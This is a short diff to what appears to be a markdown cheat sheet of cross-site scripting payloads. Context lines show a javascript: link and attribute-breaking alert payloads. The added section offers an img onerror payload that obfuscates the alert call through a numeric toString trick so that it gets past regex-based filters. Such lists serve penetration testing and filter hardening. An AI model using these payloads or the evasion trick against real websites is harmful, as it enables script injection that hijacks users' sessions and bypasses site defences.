@@ -53,3 +53,8 @@ TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt;
 "autofocus/onfocus=alert(1)//
 '-alert(1)-'
 ```
+
+## XSS payload with Alert Obfuscation, for bypass RegEx filters
+```js
+<img src="X" onerror=top[8680439..toString(30)](1337)>
+```
